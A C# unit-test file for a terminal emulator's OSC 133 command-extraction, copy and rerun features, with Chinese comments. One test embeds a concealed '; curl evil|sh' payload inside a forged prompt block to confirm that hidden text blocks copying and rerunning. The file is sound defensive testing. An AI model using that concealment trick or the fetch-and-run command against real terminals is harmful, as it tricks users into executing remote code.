using System.Text;
using VelaShell.Terminal.Emulation;
using VelaShell.Terminal.Semantics;

namespace VelaShell.Terminal.Tests.Emulation;

/// <summary>
/// OSC 133 的 <c>B</c>(提示符结束的那一列)与「这条命令」的切取:
/// 「复制这条命令」「重跑」靠它把命令文本从 B 切到 C。
/// </summary>
/// <remarks>
/// 这一组守的是三件事:B / C 的<b>列</b>记对了;列在改列宽重排后跟着内容走(切出来的文本前后一字不差);
/// 切不出来的(没有 B、没有 C、续行没标)如实说切不出来,而不是切一段似是而非的文本去重跑。
/// </remarks>
[TestClass]
[TestCategory("Emulator")]
public class Osc133CommandInputTests
{
    private static TerminalEmulator New(int cols = 40, int rows = 10) => new(cols, rows, TerminalType.XtermColor256);

    private static void Feed(TerminalEmulator e, string s) => e.Feed(Encoding.UTF8.GetBytes(s));

    private const string A = "\e]133;A\e\\";
    private const string B = "\e]133;B\e\\";
    private const string C = "\e]133;C\e\\";

    private static string D(int code) => $"\e]133;D;{code}\e\\";

    /// <summary>跑一条完整的命令:提示符 → 命令回显 → 换行 → 输出 → 结束。</summary>
    private static void RunCommand(TerminalEmulator e, string command, string output = "out", int exitCode = 0) =>
        Feed(e, A + "$ " + B + command + "\r\n" + C + (output.Length > 0 ? output + "\r\n" : "") + D(exitCode));

    /// <summary>画出下一条空提示符(光标停在 B 上),与 shell 跑完命令后的样子一致。</summary>
    private static void FreshPrompt(TerminalEmulator e) => Feed(e, A + "$ " + B);

    /// <summary>缓冲区里每条命令块切出来的命令(切不出来的记 null),自上而下。</summary>
    private static List<string?> AllCommands(TerminalEmulator e)
    {
        var commands = new List<string?>();
        for (int abs = CommandBlocks.NextPrompt(e.Screen, -1); abs >= 0; abs = CommandBlocks.NextPrompt(e.Screen, abs))
        {
            commands.Add(CommandBlocks.CommandInputOf(e.Screen, CommandBlocks.BlockAt(e.Screen, abs)!.Value)?.Text);
        }
        return commands;
    }

    private static CommandInput? InputOfBlockAt(TerminalEmulator e, int abs) =>
        CommandBlocks.CommandInputOf(e.Screen, CommandBlocks.BlockAt(e.Screen, abs)!.Value);

    [TestMethod]
    public void B_RecordsTheColumnWhereThePromptEnds()
    {
        TerminalEmulator e = New();
        Feed(e, A + "user@host:~$ " + B);

        Assert.AreEqual(13, e.Screen.ViewLine(0).InputStart, "B 记的是提示符结束的那一列。");
        Assert.AreEqual(-1, e.Screen.ViewLine(0).InputEnd, "还没回车,没有 C。");
    }

    [TestMethod]
    public void C_RecordsItsColumn_AlongsideTheOutputMark()
    {
        TerminalEmulator e = New();
        Feed(e, A + "$ " + B + "ls\r\n" + C);

        Assert.AreEqual(PromptMark.Output, e.Screen.ViewLine(1).Mark);
        Assert.AreEqual(0, e.Screen.ViewLine(1).InputEnd);
    }

    [TestMethod]
    public void CommandText_IsCutBetweenBAndC()
    {
        TerminalEmulator e = New();
        RunCommand(e, "ls -la /tmp", "total 0");

        CommandInput input = InputOfBlockAt(e, 0)!;
        Assert.AreEqual("ls -la /tmp", input.Text);
        Assert.IsFalse(input.IsMultiline);
        Assert.IsTrue(input.CanRerun);
    }

    [TestMethod]
    public void LeadingSpaces_AreKept_TrailingOnesAreNot()
    {
        // 行首空格是 bash HISTCONTROL=ignorespace 的「别记历史」,重跑时去掉它就把这条记进了历史。
        TerminalEmulator e = New();
        RunCommand(e, "  secret-cmd   ");

        Assert.AreEqual("  secret-cmd", InputOfBlockAt(e, 0)!.Text);
    }

    [TestMethod]
    public void CommandText_AcrossSoftWraps_IsOneLine()
    {
        // 被自动换行折开的一条长命令仍是一行;中间不许多出换行(那等于替用户按了回车)。
        TerminalEmulator e = New(cols: 12);
        RunCommand(e, "echo abcdefghijklmnopqrstuvwxyz");

        CommandInput input = InputOfBlockAt(e, 0)!;
        Assert.AreEqual("echo abcdefghijklmnopqrstuvwxyz", input.Text);
        Assert.IsFalse(input.IsMultiline);
    }

    [TestMethod]
    public void WideCharacters_SurviveTheCut()
    {
        TerminalEmulator e = New(cols: 11);
        RunCommand(e, "cd 中文目录/子目录");

        Assert.AreEqual("cd 中文目录/子目录", InputOfBlockAt(e, 0)!.Text);
    }

    [TestMethod]
    public void Reflow_KeepsEveryCutTextIdentical_NarrowerThenWiderThenBack()
    {
        // 这正是当初不做 B 的原因:列在改列宽之后整体挪位。改列宽前后切出来的文本必须一字不差。
        TerminalEmulator e = New(cols: 30, rows: 8);
        RunCommand(e, "ls -la");
        RunCommand(e, "echo a-fairly-long-argument-that-wraps-somewhere", "a-fairly-long");
        RunCommand(e, "cd 中文目录/很长很长的子目录名字");
        RunCommand(e, "true", "");
        FreshPrompt(e);
        List<string?> before = AllCommands(e);
        Assert.AreSequenceEqual(
            ["ls -la", "echo a-fairly-long-argument-that-wraps-somewhere", "cd 中文目录/很长很长的子目录名字", "true", null], before);

        foreach (int cols in new[] { 9, 13, 80, 17, 30 })
        {
            e.Resize(cols, 8);
            Assert.AreSequenceEqual(before, AllCommands(e), $"改到 {cols} 列后切出来的命令变了。");
        }
    }

    [TestMethod]
    public void Reflow_KeepsTheCurrentPromptIdle()
    {
        // 光标与 B 一起穿过 reflow:改完窗口宽度,「重跑」不该因为两者错开一列就灰掉。
        TerminalEmulator e = New(cols: 30, rows: 6);
        RunCommand(e, "ls");
        FreshPrompt(e);
        Assert.IsTrue(CommandBlocks.IsIdleAtPrompt(e));

        e.Resize(12, 6);
        Assert.IsTrue(CommandBlocks.IsIdleAtPrompt(e), "变窄之后。");
        e.Resize(50, 6);
        Assert.IsTrue(CommandBlocks.IsIdleAtPrompt(e), "再变宽之后。");
    }

    [TestMethod]
    public void Reflow_PromptEndingWithCursorMovement_KeepsBWhereItWas()
    {
        // 提示符以光标右移(而不是空格)收尾时,B 落在内容之后的一格空白上。
        TerminalEmulator e = New(cols: 30, rows: 6);
        Feed(e, A + "$\e[2C" + B);
        Assert.AreEqual(3, e.Screen.ViewLine(0).InputStart);
        Assert.IsTrue(CommandBlocks.IsIdleAtPrompt(e));

        e.Resize(20, 6);

        Assert.AreEqual(3, e.Screen.ViewLine(e.Screen.ScrollbackCount + e.CursorY).InputStart);
        Assert.IsTrue(CommandBlocks.IsIdleAtPrompt(e));
    }

    [TestMethod]
    public void PromptFillingTheRowExactly_StartsTheCommandOnTheNextRow()
    {
        // 提示符恰好占满一行时光标停在行尾等着折行。B 记成最后一列的话,提示符的最后一个字符
        // 就被算进了命令。
        TerminalEmulator e = New(cols: 10);
        Feed(e, A + "123456789$" + B);
        Assert.AreEqual(10, e.Screen.ViewLine(0).InputStart, "等着折行时记成 Columns。");

        Feed(e, "ls\r\n" + C + "x\r\n" + D(0));

        Assert.AreEqual("ls", InputOfBlockAt(e, 0)!.Text);
        e.Resize(7, 10);
        Assert.AreEqual("ls", InputOfBlockAt(e, 0)!.Text, "重排之后同样。");
    }

    [TestMethod]
    public void WithoutB_ThereIsNoCommand()
    {
        // 老的集成脚本只发 A/C/D:不知道提示符在哪一列结束,硬猜会把提示符的一截当成命令。
        TerminalEmulator e = New();
        Feed(e, A + "$ ls\r\n" + C + "out\r\n" + D(0));

        Assert.IsNotNull(CommandBlocks.BlockAt(e.Screen, 0));
        Assert.IsNull(InputOfBlockAt(e, 0));
    }

    [TestMethod]
    public void WithoutC_ThereIsNoCommand_StillTypingOrCancelled()
    {
        // 敲了一半按 Ctrl+C:bash 回显 ^C、不打 PS0(没有 C),直接画下一条提示符。
        // 切出来会是 "foo^C" —— 那不是「这条命令」,更不该拿去重跑。
        TerminalEmulator e = New();
        Feed(e, A + "$ " + B + "foo^C\r\n" + D(130));
        FreshPrompt(e);
        Feed(e, "half typed");

        Assert.IsNull(InputOfBlockAt(e, 0), "取消掉的那一条。");
        Assert.IsNull(InputOfBlockAt(e, 1), "还在敲的这一条。");
    }

    [TestMethod]
    public void EmptyCommand_IsNoCommand()
    {
        TerminalEmulator e = New();
        Feed(e, A + "$ " + B + "\r\n" + C + D(0));
        FreshPrompt(e);

        Assert.IsNull(InputOfBlockAt(e, 0), "在提示符上直接回车,没有可复制、可重跑的东西。");
    }

    [TestMethod]
    public void CommandWithoutOutput_IsStillCut_ThoughTheNextPromptOverwroteItsOutputMark()
    {
        // cd 之类没有输出:下一条提示符就画在 C 那一行,行标记被 A 改写成 Prompt。
        // C 的列另记着,这条命令照样切得出来;下一条命令也不该被上一条的 C 截成空串。
        TerminalEmulator e = New();
        RunCommand(e, "cd /tmp", "");
        RunCommand(e, "pwd", "/tmp");

        Assert.AreEqual(PromptMark.Prompt, e.Screen.ViewLine(1).Mark, "C 那一行被下一条提示符占了。");
        Assert.AreEqual("cd /tmp", InputOfBlockAt(e, 0)!.Text);
        Assert.AreEqual("pwd", InputOfBlockAt(e, 1)!.Text);
    }

    [TestMethod]
    public void CommandWithoutOutput_UnderZsh_SurvivesPromptSpErasingTheCRow()
    {
        // zsh 跑完 cd:先在 C 那一行补 PROMPT_SP(一个 % 加一整行空格、回车、空格、回车),
        // precmd 发 D,再回到行首 ESC[J 把这一行擦空,然后在同一行画下一条提示符(A 写在 PS1 里)。
        // 字节序列照真 zsh 5.9 的原始输出(Osc133CommandInputDockerTests)抄的。
        TerminalEmulator e = New(cols: 20);
        Feed(e, A + "% " + B + "cd /tmp\r\n" + C);
        Feed(e, "\e[7m%\e[27m" + new string(' ', 19) + "\r \r" + D(0) + "\r\e[0m\e[J" + A + "% " + B);

        Assert.AreEqual("cd /tmp", InputOfBlockAt(e, 0)!.Text, "C 那一行被擦空过,命令照样切得出来。");
        Assert.IsTrue(CommandBlocks.IsIdleAtPrompt(e));
    }

    [TestMethod]
    public void OutputWithoutTrailingNewline_UnderZsh_DoesNotSwallowTheNextPromptOnReflow()
    {
        // printf 不带换行:zsh 在输出后面补一个 %,再用一整行空格把光标「折」到下一行,
        // 回到行首 ESC[J 擦掉,在那一行画提示符。软换行标志记在输出那一行上 —— 不断开的话,
        // 一改列宽提示符就被并进输出的逻辑行,提示符标记(逻辑行只留第一段的)随之丢失。
        TerminalEmulator e = New(cols: 20);
        Feed(e, A + "% " + B + "printf hi\r\n" + C + "hi");
        Feed(e, "\e[7m%\e[27m" + new string(' ', 19) + "\r \r" + D(0) + "\r\e[0m\e[J" + A + "% " + B + "ls\r\n" + C + "a b\r\n" + D(0));
        FreshPrompt(e);
        List<string?> before = AllCommands(e);
        Assert.AreSequenceEqual(["printf hi", "ls", null], before);

        foreach (int cols in new[] { 9, 31, 20 })
        {
            e.Resize(cols, 10);
            Assert.AreSequenceEqual(before, AllCommands(e), $"改到 {cols} 列后。");
        }
    }

    [TestMethod]
    public void EraseBelowFromColumnZero_SeversTheRowFromThePreviousOne_ButMidRowEraseDoesNot()
    {
        TerminalEmulator e = New(cols: 10);
        Feed(e, "0123456789abc");               // 第 0 行折进第 1 行
        Assert.IsTrue(e.Screen.ViewLine(0).Wrapped);

        Feed(e, "\e[2;3H\e[J");                // 从第 1 行第 3 列擦起:"ab" 还在,仍是续段
        Assert.IsTrue(e.Screen.ViewLine(0).Wrapped);

        Feed(e, "\e[2;1H\e[J");                // 从行首擦起:这一行整个不要了
        Assert.IsFalse(e.Screen.ViewLine(0).Wrapped);
    }

    [TestMethod]
    public void FullRowOverwrite_StillDropsC()
    {
        // 留着 C 的只有「擦到行尾 / 擦到屏尾把这一行擦空」这一种;整行覆写(EL 2)照旧全清。
        TerminalEmulator e = New();
        Feed(e, A + "$ " + B + "ls\r\n" + C + "x");
        Feed(e, "\e[2K");

        Assert.AreEqual(-1, e.Screen.ViewLine(1).InputEnd);
    }

    [TestMethod]
    public void CommandWithoutOutput_ThenAPromptStillBeingTyped()
    {
        TerminalEmulator e = New();
        RunCommand(e, "cd /tmp", "");
        FreshPrompt(e);
        Feed(e, "vi");

        Assert.AreEqual("cd /tmp", InputOfBlockAt(e, 0)!.Text);
        Assert.IsNull(InputOfBlockAt(e, 1), "下一条还没回车。");
    }

    [TestMethod]
    public void MultilineCommand_WithMarkedContinuations_CutsThePs2PromptsOff()
    {
        // 片段给 PS2 末尾也接了 B:每个续行从自己的 B 切起,"> " 不进命令文本。
        TerminalEmulator e = New();
        Feed(e, A + "$ " + B + "for i in 1 2; do\r\n"
                + "> " + B + "echo $i\r\n"
                + "> " + B + "done\r\n"
                + C + "1\r\n2\r\n" + D(0));

        CommandInput input = InputOfBlockAt(e, 0)!;
        Assert.AreEqual("for i in 1 2; do\necho $i\ndone", input.Text);
        Assert.AreEqual(3, input.LineCount);
        Assert.IsTrue(input.IsMultiline);
        Assert.IsTrue(input.CanRerun);
    }

    [TestMethod]
    public void MultilineCommand_WithUnmarkedContinuations_CanBeCopiedButNotRerun()
    {
        // 续行没标 B(老片段、或别人接管了 PS2):"> " 和命令正文分不开。重跑
        // `cat <<EOF` / `> important.txt` / `> EOF`,第二行就成了把 important.txt 截成空文件。
        TerminalEmulator e = New();
        Feed(e, A + "$ " + B + "cat <<EOF\r\n"
                + "> important.txt\r\n"
                + "> EOF\r\n"
                + C + "important.txt\r\n" + D(0));

        CommandInput input = InputOfBlockAt(e, 0)!;
        Assert.AreEqual("cat <<EOF\n> important.txt\n> EOF", input.Text, "复制给的是屏幕上看见的样子。");
        Assert.IsTrue(input.HasUnmarkedContinuation);
        Assert.IsFalse(input.CanRerun);
    }

    [TestMethod]
    public void MultilineCommand_SurvivesReflow()
    {
        TerminalEmulator e = New(cols: 30);
        Feed(e, A + "$ " + B + "for f in alpha beta gamma; do\r\n"
                + "> " + B + "echo \"$f is a rather long line\"\r\n"
                + "> " + B + "done\r\n"
                + C + "x\r\n" + D(0));
        string before = InputOfBlockAt(e, 0)!.Text;

        e.Resize(11, 10);
        int prompt = CommandBlocks.NextPrompt(e.Screen, -1);
        Assert.AreEqual(before, InputOfBlockAt(e, prompt)!.Text);
        Assert.IsTrue(InputOfBlockAt(e, prompt)!.CanRerun, "续行上的 B 也要跟着重排走。");
    }

    [TestMethod]
    public void ControlCharacters_AreStrippedFromTheCut()
    {
        // C1(U+0080–U+009F)是零宽字符,会被当成组合标记挂在前一格上。Latin-1 一类的会话字符集
        // 编出来就是 8 位 CSI(0x9B):屏幕上看不见的控制字符一个都不该跟着「重跑」回去。
        TerminalEmulator e = New();
        Feed(e, A + "$ " + B + "ls\u009b31m -l\u0085a\u007f\r\n" + C + "x\r\n" + D(0));

        CommandInput input = InputOfBlockAt(e, 0)!;
        Assert.AreEqual("ls31m -la", input.Text);
        Assert.DoesNotContain(ch => ch is < (char)0x20 or >= '\u007f' and <= '\u009f', input.Text);
        // 剔掉之后的文本也不是屏幕上那条:整条不给复制、不给重跑。
        Assert.IsTrue(input.HasHiddenText);
        Assert.IsFalse(input.CanCopy);
        Assert.IsFalse(input.CanRerun);
    }

    [TestMethod]
    public void ControlCharactersWrittenStraightIntoACell_AreStrippedToo()
    {
        // 打印路径进不了 C0;直接写格子模拟别的写入路径漏进来的情形,切取仍要兜住。
        TerminalEmulator e = New();
        RunCommand(e, "abc");
        e.Screen.SetCell(3, 0, new TerminalCell { Rune = 0x1B });

        CommandInput input = InputOfBlockAt(e, 0)!;
        Assert.AreEqual("ac", input.Text);
        Assert.IsFalse(input.CanCopy);
        Assert.IsFalse(input.CanRerun);
    }

    [TestMethod]
    public void ConcealedText_BetweenBAndC_CannotBeCopiedOrRerun()
    {
        // OSC 133 标记谁都能发:输出里伪造的块,屏幕上只画出 ls,SGR 8 那一截渲染时不画。
        TerminalEmulator e = New();
        Feed(e, A + "$ " + B + "ls\e[8m; curl evil|sh\e[28m\r\n" + C + "x\r\n" + D(0));

        CommandInput input = InputOfBlockAt(e, 0)!;
        Assert.IsTrue(input.HasHiddenText);
        Assert.IsFalse(input.CanCopy);
        Assert.IsFalse(input.CanRerun);
    }

    [TestMethod]
    public void ColouredCommandText_AndConcealedSpaces_AreStillFine()
    {
        // 语法高亮(zsh-syntax-highlighting、fish)给命令行上色是常态;隐藏的空格看上去还是空格。
        TerminalEmulator e = New();
        Feed(e, A + "$ " + B + "\e[32mls\e[0m\e[8m \e[28m\e[4m-la\e[24m\r\n" + C + "x\r\n" + D(0));

        CommandInput input = InputOfBlockAt(e, 0)!;
        Assert.AreEqual("ls -la", input.Text);
        Assert.IsFalse(input.HasHiddenText);
        Assert.IsTrue(input.CanCopy);
        Assert.IsTrue(input.CanRerun);
    }

    [TestMethod]
    public void CommandsScrolledIntoScrollback_CanStillBeCut()
    {
        TerminalEmulator e = New(cols: 20, rows: 4);
        RunCommand(e, "make build");
        for (int i = 0; i < 20; i++)
        {
            Feed(e, $"line {i}\r\n");
        }

        int prompt = CommandBlocks.NextPrompt(e.Screen, -1);
        Assert.IsLessThan(e.Screen.ScrollbackCount, prompt, "提示符已经在回滚区里。");
        Assert.AreEqual("make build", InputOfBlockAt(e, prompt)!.Text);
    }

    [TestMethod]
    public void CommandsTrimmedOutOfScrollback_AreGone()
    {
        TerminalEmulator e = new(20, 4, TerminalType.XtermColor256, scrollback: 5);
        RunCommand(e, "make build");
        for (int i = 0; i < 20; i++)
        {
            Feed(e, $"line {i}\r\n");
        }

        Assert.AreEqual(-1, CommandBlocks.NextPrompt(e.Screen, -1), "提示符行已经被挤出回滚区。");
    }

    [TestMethod]
    public void ClearingTheScreen_DropsBAndC()
    {
        TerminalEmulator e = New();
        RunCommand(e, "ls");
        Feed(e, "\e[H\e[2J");

        for (int abs = 0; abs < e.Screen.TotalRows; abs++)
        {
            Assert.AreEqual(-1, e.Screen.ViewLine(abs).InputStart, $"第 {abs} 行的 B 该随整行擦除作废。");
            Assert.AreEqual(-1, e.Screen.ViewLine(abs).InputEnd, $"第 {abs} 行的 C 该随整行擦除作废。");
        }
    }

    [TestMethod]
    public void AlternateScreen_DoesNotTouchTheMainScreensBlocks()
    {
        TerminalEmulator e = New();
        RunCommand(e, "vim notes.txt", "");
        Feed(e, "\e[?1049h" + A + "fake " + B + "x\r\n" + C + "\e[?1049l");

        Assert.AreEqual("vim notes.txt", InputOfBlockAt(e, 0)!.Text);
    }

    // ---- IsIdleAtPrompt:「重跑」只往一条空的新提示符里打字 -----------------------------------

    [TestMethod]
    public void Idle_AtAFreshPrompt()
    {
        TerminalEmulator e = New();
        RunCommand(e, "ls");
        FreshPrompt(e);

        Assert.IsTrue(CommandBlocks.IsIdleAtPrompt(e));
    }

    [TestMethod]
    public void NotIdle_WithHalfATypedCommand()
    {
        TerminalEmulator e = New();
        FreshPrompt(e);
        Feed(e, "rm -rf bu");

        Assert.IsFalse(CommandBlocks.IsIdleAtPrompt(e), "再打一串进去就和这半截拼成一条谁也没想执行过的命令。");
    }

    [TestMethod]
    public void NotIdle_WhenTheCursorWasMovedBackOverTypedText()
    {
        // 敲了 ls 再按 Home:光标回到 B 上,可后面还躺着 ls。
        TerminalEmulator e = New();
        FreshPrompt(e);
        Feed(e, "ls\e[2D");

        Assert.IsFalse(CommandBlocks.IsIdleAtPrompt(e));
    }

    [TestMethod]
    public void Idle_WithARightPromptOnTheSameRow()
    {
        // zsh 的 RPROMPT 画在同一行右端:看整行剩余部分就永远不空,只看光标下那一格。
        TerminalEmulator e = New();
        Feed(e, A + "$ " + B + "\e7\e[1;30H12:34:56\e8");

        Assert.IsTrue(CommandBlocks.IsIdleAtPrompt(e));
    }

    [TestMethod]
    public void NotIdle_WhileTheCommandIsStillRunning()
    {
        // C 来了、D 还没来:打进去的「命令 + 回车」会变成前台程序的输入(sudo 的口令提示、ssh 进去的另一台机器)。
        TerminalEmulator e = New();
        Feed(e, A + "$ " + B + "sudo -v\r\n" + C + "[sudo] password: ");

        Assert.IsTrue(e.IsCommandRunning);
        Assert.IsFalse(CommandBlocks.IsIdleAtPrompt(e));
    }

    [TestMethod]
    public void NotIdle_WhileRunning_EvenWithTheCursorStillOnB()
    {
        // 有的集成在回显换行之前就发 C(光标还停在 B 上),命令又一个字都还没输出:
        // 光标位置看着像空提示符,真正挡住的是「C 之后还没 D」。
        // 两行提示符(第一行是 user@host,B 在第二行):C 落在 B 那一行,A 那一行的标记还在。
        TerminalEmulator e = New();
        Feed(e, A + "user@host\r\n$ " + B + C);

        Assert.AreEqual(2, e.CursorX);
        Assert.IsTrue(e.IsCommandRunning);
        Assert.IsFalse(CommandBlocks.IsIdleAtPrompt(e));
    }

    [TestMethod]
    public void NotIdle_AtAPromptDrawnInsideTheAlternateScreen()
    {
        // 全屏程序(tmux 一类)自己在备用屏里画出带标记的提示符:那是它的画面,不是这条会话的 shell。
        TerminalEmulator e = New();
        RunCommand(e, "tmux", "");
        Feed(e, "\e[?1049h" + A + "$ " + B);

        Assert.IsFalse(CommandBlocks.IsIdleAtPrompt(e));
    }

    [TestMethod]
    public void NotIdle_InTheAlternateScreen()
    {
        TerminalEmulator e = New();
        RunCommand(e, "ls");
        FreshPrompt(e);
        Feed(e, "\e[?1049h");

        Assert.IsFalse(CommandBlocks.IsIdleAtPrompt(e));
    }

    [TestMethod]
    public void NotIdle_AtAContinuationPrompt()
    {
        // 正在 PS2 续行里敲多行命令:光标停在续行的 B 上,但那是一条命令的中间。
        TerminalEmulator e = New();
        Feed(e, A + "$ " + B + "for i in 1 2; do\r\n> " + B);

        Assert.IsFalse(CommandBlocks.IsIdleAtPrompt(e));
    }

    [TestMethod]
    public void NotIdle_WithoutB()
    {
        TerminalEmulator e = New();
        Feed(e, A + "$ ");

        Assert.IsFalse(CommandBlocks.IsIdleAtPrompt(e), "没有 B 就判断不了命令行是不是空的。");
    }

    [TestMethod]
    public void NotIdle_WithoutShellIntegration()
    {
        TerminalEmulator e = New();
        Feed(e, "$ ");

        Assert.IsFalse(CommandBlocks.IsIdleAtPrompt(e));
    }

    [TestMethod]
    public void CommandRunning_FollowsCThenDOrA_AndResetsOnRis()
    {
        TerminalEmulator e = New();
        Feed(e, A + "$ " + B + "x\r\n" + C);
        Assert.IsTrue(e.IsCommandRunning);
        Feed(e, D(0));
        Assert.IsFalse(e.IsCommandRunning, "D = 结束。");

        Feed(e, A + "$ " + B + "y\r\n" + C);
        FreshPrompt(e);
        Assert.IsFalse(e.IsCommandRunning, "没发 D 的集成:新提示符同样意味着上一条结束了。");

        Feed(e, A + "$ " + B + "z\r\n" + C + "\ec");
        Assert.IsFalse(e.IsCommandRunning, "RIS 清空一切。");
    }
}
